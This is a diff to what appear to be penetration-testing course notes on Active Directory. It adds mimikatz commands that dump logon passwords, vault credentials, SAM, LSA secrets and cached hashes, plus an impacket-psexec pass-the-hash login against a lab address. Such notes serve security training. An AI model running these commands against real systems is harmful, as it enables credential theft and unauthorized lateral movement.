@@ -2488,6 +2488,17 @@ privilege::debug
 
 sekurlsa::logonpasswords
 ```
+	
+Can also try the following:
+```
+sekurlsa::logonpasswords
+vault::cred /patch
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+```
+	
 Show the Offsec user's tickets that are stored in memory with `sekurlsa::tickets`. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain.
 
 #### Service Account Attacks
@@ -2532,7 +2543,10 @@ We can use an existing implementation (https://web.archive.org/web/2022022519004
 **Note**: You may use `impacket-psexec` to login with any credentials that you have obtained. E.g. if you have obtained SPN hash for a SQL server, this command would work:
 ```
 impacket-psexec sqlserver:<password>@<IP>
+
+impacket-psexec -hashes <lmhash/MsCachev2>:<NTLM> <user>@10.11.1.122
 ```
+`MsCachev2` can be obtained by executing `lsadump::cache` in `mimikatz`.
 	
 ### AD Lateral Movement
 #### Pass The Hash
